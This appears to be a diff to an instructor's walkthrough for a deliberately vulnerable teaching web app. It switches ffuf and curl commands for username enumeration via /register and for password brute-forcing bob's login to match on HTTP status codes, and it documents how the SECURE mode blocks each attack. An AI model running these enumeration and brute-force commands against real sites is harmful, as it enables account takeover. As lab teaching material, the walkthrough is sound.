@@ -37,44 +37,45 @@ register-form enumeration (finds bob AND dd_root_07)  ->  brute-force bob
 
 ### Step 1 — Username enumeration via `/register`
 
-The registration form reveals whether a username is taken ("That username is
-already taken.") versus free. That's an enumeration oracle. Fuzz it:
+The registration endpoint answers with a **different HTTP status** for a taken
+username (`409 Conflict`) versus a free one (`201 Created`). That status is the
+enumeration oracle — match on it with ffuf:
 
 ```bash
 ffuf -w usernames.txt -u http://localhost:3000/register \
      -X POST -d "username=FUZZ&password=x" \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -mr "already" -c          # match the 'already taken' response = existing users
+     -mc 409 -c                # 409 = username already exists
 ```
 
-`-mr "already"` lists exactly the usernames that exist (the redirect body is URL-
-encoded as `already%20taken`, so match the bare word `already`, not `already taken`).
-You'll find `alice, bob, charlie, dave, support, student, dd_root_07`, etc.
+`-mc 409` lists exactly the usernames that exist. You'll find
+`alice, bob, charlie, dave, support, student, dd_root_07`, etc.
 
 > Side effect: fuzzing `/register` also *creates* an account for every username
-> that was free. Harmless in the lab (restart to reset), and the "taken" hits are
-> still the signal you want.
+> that was free (those return `201`). Harmless in the lab (restart to reset); the
+> `409` hits are the signal you want.
 
 Manual check:
 
 ```bash
-curl -s -i -X POST -d "username=bob&password=x" http://localhost:3000/register | grep -i location
-# -> Location: /register?msg=That%20username%20is%20already%20taken.
+curl -s -o /dev/null -w "%{http_code}\n" -X POST -d "username=bob&password=x" http://localhost:3000/register
+# -> 409      (a free name returns 201)
 ```
 
-> Note the contrast to teach: **login** stays generic ("Invalid credentials") —
-> it does *not* leak. The signup form is the leak. Same app, one endpoint done
-> right and one done wrong.
+> Note the contrast to teach: **login** stays generic (`401` for any bad attempt,
+> no "no such user") — it does *not* leak. The signup form is the leak. Same app,
+> one endpoint done right and one done wrong.
 
 ### Step 2 — Brute-force bob (no rate limit)
 
-Login has no lockout and no delay, so a small wordlist cracks the weak password:
+Login has no lockout and no delay, so a small wordlist cracks the weak password.
+A correct password returns `200`; every wrong attempt returns `401`:
 
 ```bash
 ffuf -w passwords.txt -u http://localhost:3000/login \
      -X POST -d "username=bob&password=FUZZ" \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -mr "Found. Redirecting to /dashboard" -c
+     -mc 200 -c                # or: -fc 401  (filter the failures out)
 # the hit is password=qwerty
 ```
 
@@ -155,11 +156,28 @@ entire user base. `dd_root_07` never falls to guessing — only to the md5 forge
 
 ### Verified SECURE-mode behaviour
 
-- Forged `sid=md5("dd_root_07")` → `/admin` returns **403** (doesn't resolve).
-- `/register` on an existing name → generic "if that username is available…" message.
-- 5 bad logins for bob → account locked; the correct password is then refused.
+- Forged `sid=md5("dd_root_07")` → `/admin` returns **401** (doesn't resolve).
+- `/register` on an existing name → **200**, identical to a free name (no `409`
+  oracle), so `-mc 409` returns nothing — enumeration is dead.
+- 5 bad logins → account locked (**429**); the correct password is then also
+  refused with `429`, so `-mc 200` never fires — brute-force stalls.
 - `alice` logs in → `sid` is a random 48-hex token, **not** `md5("alice")`.
-- `/members` as a non-admin → **403** (in both modes — it is correctly admin-only).
+- `/members` as a non-admin → **403** (both modes — it is correctly admin-only).
+
+### Status-code map (why this app is ffuf-friendly)
+
+Every auth response renders inline with a meaningful status — no 302 redirects —
+so a fuzzer matches on the code, not the body:
+
+| Code | Meaning |
+|---|---|
+| `200` | login success / page OK |
+| `201` | registration created a new account |
+| `400` | missing username or password |
+| `401` | bad credentials, or not signed in |
+| `403` | signed in but wrong role (e.g. non-admin at `/members`, `/admin`) |
+| `409` | username already taken (the enumeration signal) |
+| `429` | rate-limited / account locked (SECURE mode) |
 
 ### The one-line takeaways for the board
 
